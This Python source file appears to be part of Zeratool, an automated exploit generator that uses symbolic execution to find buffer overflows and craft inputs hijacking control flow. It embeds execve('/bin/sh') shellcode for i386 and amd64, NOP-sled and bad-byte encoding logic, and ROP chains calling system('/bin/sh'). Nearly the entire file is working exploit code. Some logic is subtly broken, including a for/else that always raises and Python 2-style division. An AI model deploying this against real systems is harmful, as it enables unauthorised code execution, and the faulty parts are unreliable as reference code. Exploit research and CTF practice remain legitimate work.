import claripy
from .radare_helper import findShellcode
from pwn import *
import timeout_decorator
from zeratool import overflowExploitSender

is_printable = False


def constrainToAddress(state, sym_val, addr, endian="little"):

    bits = state.arch.bits
    padded_addr = 0

    if bits == 32:
        padded_addr = p32(addr, endian=endian)
    elif bits == 64:
        botAddr = addr & 0xFFFFFFFF
        topAddr = (addr >> 32) & 0xFFFFFFFF
        padded_addr = p32(topAddr, endian=endian) + p32(botAddr, endian=endian)

    constraints = []
    for i in range(bits / 8):
        curr_byte = sym_val.get_byte(i)
        constraint = claripy.And(curr_byte == padded_addr[i])
        if state.se.satisfiable(extra_constraints=[constraint]):
            constraints.append(constraint)

    return constraints


def getShellcode(properties):
    context.arch = properties["protections"]["arch"]
    context.bits = 32

    if context.arch == "i386":  # /bin/sh shellcode - 23 bytes
        shellcode = (
            b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
            + b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
        )
    elif context.arch == "amd64":  # /bin/sh shellcode - 23 bytes
        context.bits = 64
        shellcode = (
            b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
            + b"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
        )
    else:
        assembly = shellcraft.sh()  # This works, but the shellcode is usually long
        shellcode = asm(assembly)
    return shellcode


def get_rop_chain(properties):
    context.binary = properties["file"]
    elf = ELF(properties["file"])
    rop = ROP(elf)

    strings = [b"/bin/sh\x00", b"/bin/bash\x00"]
    functions = ["system","execve"]

    ret_func = None
    ret_string = None

    # Find the function we want to call
    for function in functions:
        if function in elf.symbols:
            ret_func = elf.symbols["system"]
        elif function in elf.plt:
            ret_func = elf.plt["system"]
    else:
        raise RuntimeError("Cannot find symbol to return to")

    # Find the string we want to pass it
    for string in strings:
        str_occurences = list(elf.search(string))
        if str_occurences:
            ret_string = str_occurences[0]
            break

    if not ret_string:
        raise RuntimeError("Cannot find string to pass to system or exec call")

    # movabs
    rop.raw(rop.ret.address)
    rop.call(ret_func, [ret_string])

    print(rop.dump())

    return rop.build()


def find_symbolic_buffer(state, length, arg=None):
    """
    dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's
    control
    """
    # get all the symbolic bytes from stdin
    user_input = state.globals["user_input"]

    sym_addrs = []
    sym_addrs.extend(state.memory.addrs_for_name(next(iter(user_input.variables))))

    for addr in sym_addrs:
        if check_continuity(addr, sym_addrs, length):
            yield addr


def check_continuity(address, addresses, length):
    """
    dumb way of checking if the region at 'address' contains 'length' amount of controlled
    memory.
    """

    for i in range(length):
        if not address + i in addresses:
            return False

    return True


def overflow_detect_filter(simgr):

    for state in simgr.unconstrained:
        bits = state.arch.bits
        num_count = bits / 8
        pc_value = b"C" * int(num_count)

        # Check satisfiability
        if state.solver.satisfiable(extra_constraints=[state.regs.pc == pc_value]):

            state.add_constraints(state.regs.pc == pc_value)
            user_input = state.globals["user_input"]

            print("Found vulnerable state.")

            if is_printable:
                print("Constraining input to be printable")
                for c in user_input.chop(8):
                    constraint = claripy.And(c > 0x2F, c < 0x7F)
                    if state.solver.satisfiable([constraint]):
                        state.add_constraints(constraint)

            # Get input values
            input_bytes = state.solver.eval(user_input, cast_to=bytes)
            print("[+] Vulnerable path found {}".format(input_bytes))
            state.globals["type"] = "Overflow"
            state.globals["input"] = input_bytes
            simgr.stashes["found"].append(state)
            simgr.stashes["unconstrained"].remove(state)
            break

    return simgr


def point_to_win_filter(simgr):

    for state in simgr.unconstrained:
        properties = state.globals["properties"]

        for func in properties["win_functions"]:
            address = properties["win_functions"][func]["fcn_addr"]

            print("Trying {}".format(hex(address)))

            # Check satisfiability
            if state.solver.satisfiable(extra_constraints=[state.regs.pc == address]):
                state.add_constraints(state.regs.pc == address)
                user_input = state.globals["user_input"]

                if is_printable:
                    print("Constraining input to be printable")
                    for c in user_input.chop(8):
                        constraint = claripy.And(c > 0x2F, c < 0x7F)
                        if state.solver.satisfiable([constraint]):
                            state.add_constraints(constraint)

                # Get the string coming into STDIN
                input_bytes = state.solver.eval(user_input, cast_to=bytes)
                print("[+] Vulnerable path found {}".format(input_bytes))
                state.globals["type"] = "Overflow"
                state.globals["input"] = input_bytes
                simgr.stashes["found"].append(state)
                simgr.stashes["unconstrained"].remove(state)
            return simgr

    return simgr


def point_to_shellcode_filter(simgr):
    for state in simgr.unconstrained:
        properties = state.globals["properties"]
        shellcode = getShellcode(properties)

        # Find potential addresses for shellcode
        addresses = [x for x in find_symbolic_buffer(state, len(shellcode))]
        if len(addresses):
            list.sort(addresses)

        # Can we add a nop sled?
        max_nop_count = 0
        if addresses:
            for x in range(0x50):
                bigger_addrs = [
                    x for x in find_symbolic_buffer(state, len(shellcode) + x)
                ]
                if bigger_addrs:
                    addresses = bigger_addrs
                    max_nop_count = x
        if max_nop_count > 0:
            print("Adding {} nops to shellcode".format(max_nop_count))
            shellcode = b"\x90" * max_nop_count + shellcode

        # Build shellcode and check for bad chars
        avoidList = []
        for address in addresses:
            my_buf = state.memory.load(address, len(shellcode))
            if not state.satisfiable(extra_constraints=([my_buf == shellcode])):
                print("[~] Shellcode can't be placed. Checking for bad bytes.")
                for i in range(len(shellcode)):
                    curr_byte = state.memory.load(address + i, 1)
                    if state.satisfiable(
                        extra_constraints=([curr_byte == shellcode[i]])
                    ):
                        pass
                        # print("[+] Byte {} Can be {}".format(i,repr(shellcode[i])))
                    else:
                        print(
                            "[-] Address {} Byte {} Can't be {}".format(
                                hex(address + i), i, repr(shellcode[i])
                            )
                        )
                        avoidList.append(shellcode[i])
                print("Avoiding : {}".format(avoidList))
                print("Old shellcode: {} {}".format(len(shellcode), repr(shellcode)))
                try:
                    shellcode = encoders.encode(shellcode, avoidList)
                    print(
                        "New shellcode: {} {}".format(len(shellcode), repr(shellcode))
                    )
                except PwnlibException:
                    print(
                        "[-] Unable to encode shellcode to avoid {}".format(avoidList)
                    )
                except TypeError:
                    raise RuntimeError(
                        "Pwntools encoders not ported to python3. Can't encode shellcode to avoid bad byte"
                    )
                break

        # addresses = [x for x in find_symbolic_buffer(state,len(shellcode))]
        print("Trying addresses : {}".format(addresses))
        # Iterate over addresses looking for a winner
        for address in addresses:
            print("Trying address {}".format(hex(address)))

            # Setup shellcode
            memory = state.memory.load(address, len(shellcode))
            shellcode_bvv = state.solver.BVV(shellcode)

            constraint = claripy.And(memory == shellcode_bvv, state.regs.pc == address)

            # Check satisfiability
            if state.solver.satisfiable(extra_constraints=[constraint]):
                print("[+] Win")
                state.add_constraints(constraint)

                user_input = state.globals["user_input"]

                if is_printable:
                    print("Constraining input to be printable")
                    for c in user_input.chop(8):
                        constraint = claripy.And(c > 0x2F, c < 0x7F)
                        if state.solver.satisfiable([constraint]):
                            state.add_constraints(constraint)

                # Get the string coming into STDIN
                input_bytes = state.solver.eval(
                    user_input, cast_to=bytes, extra_constraints=[constraint]
                )

                # r2_address = findShellcode(state.project.filename, \
                #     state.history.bbl_addrs[-1], shellcode, input_bytes)

                # print("Got r2 address : {}".format(hex(r2_address['offset'])))
                # print("vs {}".format(hex(address)))

                # r2_constraint = claripy.And(memory == shellcode_bvv, state.regs.pc == r2_address)
                # r2_input_bytes = state.solver.eval(user_input, \
                #     cast_to=bytes, extra_constraints=[r2_constraint])

                print("[+] Vulnerable path found {}".format(input_bytes))
                state.globals["type"] = "Overflow"
                state.globals["input"] = input_bytes
                simgr.stashes["found"].append(state)
                return simgr

    return simgr


"""
This function just swaps out shellcode for ropchain.
There has to be a better way to genericize this
"""


def point_to_ropchain_filter(simgr):

    for state in simgr.unconstrained:
        properties = state.globals["properties"]
        rop_chain = get_rop_chain(properties)

        # my_buf = state.memory.load(address, len(rop_chain))
        # first_gadget = state.memory.load(address,pc_size)
        new_state = state.copy()
        user_input = new_state.globals["user_input"]

        # Only amd64 right now
        for gadget in rop_chain:
            # Previous gadget set our symbolic value
            if new_state.regs.rdi.symbolic and new_state.satisfiable(
                extra_constraints=([new_state.regs.rdi == gadget])
            ):
                print("Setting RDI to {}".format(hex(gadget)))
                new_state.add_constraints(new_state.regs.rdi == gadget)

            # Set execution gadget
            elif new_state.satisfiable(
                extra_constraints=([new_state.regs.pc == gadget])
            ):
                print("Setting PC to {}".format(hex(gadget)))
                new_state.add_constraints(new_state.regs.pc == gadget)
                new_state = new_state.step().all_successors[0]
            else:
                print("not satis on {}".format(hex(gadget)))
                break

        user_input = new_state.globals["user_input"]

        input_bytes = get_trimmed_input(user_input, new_state)

        print("[+] Vulnerable path found {}".format(input_bytes))

        new_state.globals["type"] = "Overflow"
        new_state.globals["input"] = input_bytes
        simgr.stashes["found"].append(new_state)
        break

    return simgr


def get_trimmed_input(user_input, state):
    trim_index = -1
    index = 0
    for c in user_input.chop(8):
        num_constraints = get_num_constraints(c, state)
        if num_constraints == 0 and trim_index == -1:
            trim_index = index
        else:
            trim_index == -1
        index += 1

    input_bytes = state.solver.eval(user_input, cast_to=bytes)

    if trim_index > 0:
        print("Found input without constraints starting at {}".format(trim_index))
        print("Trimming")
        return input_bytes[:trim_index]

    return input_bytes


def get_num_constraints(chop_byte, state):
    constraints = state.solver.constraints
    i = 0
    # Do any constraints mention this BV?
    for constraint in constraints:
        if any(
            chop_byte.structurally_match(x) for x in constraint.recursive_children_asts
        ):
            i += 1
    # print("{} : {} : {}".format(chop_byte,i,state.solver.eval(chop_byte,cast_to=bytes)))
    return i
